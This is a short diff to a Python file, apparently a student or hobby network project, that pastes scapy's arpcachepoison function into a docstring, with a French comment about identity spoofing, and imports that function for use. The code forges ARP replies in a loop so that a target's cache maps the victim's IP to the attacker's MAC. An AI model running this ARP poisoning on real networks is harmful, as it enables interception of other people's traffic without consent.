@@ -1,4 +1,25 @@
+'''
+On implémente une fonction built-in de scapy permettant l'usurpation d'identité
+
+@conf.commands.register
+def arpcachepoison(target, victim, interval=60):
+    # type: (str, str, int) -> None
+    """Poison target's cache with (your MAC,victim's IP) couple
+arpcachepoison(target, victim, [interval=60]) -> None
+"""
+    tmac = getmacbyip(target)
+    p = Ether(dst=tmac) / ARP(op="who-has", psrc=victim, pdst=target)
+    try:
+        while True:
+            sendp(p, iface_hint=target)
+            if conf.verb > 1:
+                os.write(1, b".")
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        pass
+'''
 from scapy.layers.l2 import arpcachepoison
+
 import threading
 __author__ = "Chauvin Antoine"
 __copyright__ = ""
